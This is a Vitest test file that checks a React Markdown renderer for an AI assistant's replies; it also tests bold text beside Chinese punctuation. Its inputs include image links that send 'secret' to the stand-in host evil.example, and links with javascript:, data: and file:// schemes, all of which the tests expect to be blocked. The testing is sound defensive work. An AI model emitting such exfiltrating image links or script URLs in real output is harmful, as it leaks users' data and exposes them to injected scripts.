import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { I18nextProvider } from 'react-i18next'
import { beforeAll, describe, expect, it } from 'vitest'
import { createI18n } from '../src/i18n/create-instance.js'

let i18n: Awaited<ReturnType<typeof createI18n>>

beforeAll(async () => {
  i18n = await createI18n('zh-CN', () => {})
})

// Load TSX through Vite, outside the Node-only typecheck project, as in renderer-approval-card.
const componentPath = '../src/renderer/src/components/thread/StreamdownText.tsx'
async function render(text: string, running = false): Promise<string> {
  const { StreamdownText } = await import(componentPath)
  return renderToStaticMarkup(
    createElement(
      I18nextProvider,
      { i18n },
      createElement(StreamdownText, {
        type: 'text',
        text,
        status: running ? { type: 'running' } : { type: 'complete' },
      }),
    ),
  )
}

describe('assistant Markdown', () => {
  it.each([
    '![x](https://evil.example/p.png?d=secret)',
    '![x](data:image/png;base64,iVBORw0KGgo=)',
    '![x](blob:https://evil.example/id)',
    '<img src="https://evil.example/p.png?d=secret" alt="x">',
  ])('复现：图片不产生图片元素或预加载，也不显示库的英文拦截提示：%s', async (text) => {
    const markup = await render(text)
    expect(markup).not.toMatch(/<img\b/)
    expect(markup).not.toContain('as="image"')
    expect(markup).not.toContain('Image blocked')
    expect(markup).not.toContain('Image not available')
  })

  it.each([
    'javascript:alert%281%29',
    'data:text/html,hello',
    'file:///tmp/secret',
    'tel:1234',
    'irc://evil.example',
    'ircs://evil.example',
    'xmpp:user@evil.example',
    'blob:https://evil.example/id',
    'streamdown:custom',
  ])('复现：不允许的链接协议不产生可点击的 href：%s', async (url) => {
    const markup = await render(`[link](${url})`)
    expect(markup).not.toMatch(/<a\b[^>]*\bhref=/)
    expect(markup).not.toMatch(/<button\b[^>]*data-streamdown="link"/)
    expect(markup).not.toContain('[blocked]')
    expect(markup).toContain('link')
  })

  it.each(['https://example.com/path', 'http://example.com/path', 'mailto:a@example.com'])(
    '复现：允许的三种协议保留可点击链接：%s',
    async (url) => {
      // Link safety renders a button that opens its confirmation dialog, not a naked href.
      expect(await render(`[link](${url})`)).toMatch(
        /<button\b[^>]*data-streamdown="link"[^>]*>link<\/button>/,
      )
    },
  )

  it.each([
    ['**注意：**这一步', '注意：'],
    ['结果为**42%**左右', '42%'],
    ['**“引号里的加粗”**', '“引号里的加粗”'],
    ['**结果：**42%', '结果：'],
  ])('复现：中文标点与数字旁的加粗生成加粗元素，不露星号：%s', async (text, strong) => {
    const markup = await render(text)
    expect(markup).toMatch(
      new RegExp(`<span\\b[^>]*data-streamdown="strong"[^>]*>${strong}</span>`),
    )
    expect(markup.replace(/<[^>]*>/g, '')).not.toContain('**')
  })

  it('复现：流式半截中文加粗不露星号', async () => {
    const markup = await render('**注意：', true)
    expect(markup).toContain('data-streaming="true"')
    expect(markup).toMatch(/<span\b[^>]*data-streamdown="strong"[^>]*>注意：<\/span>/)
    expect(markup.replace(/<[^>]*>/g, '')).not.toContain('**')
  })
})
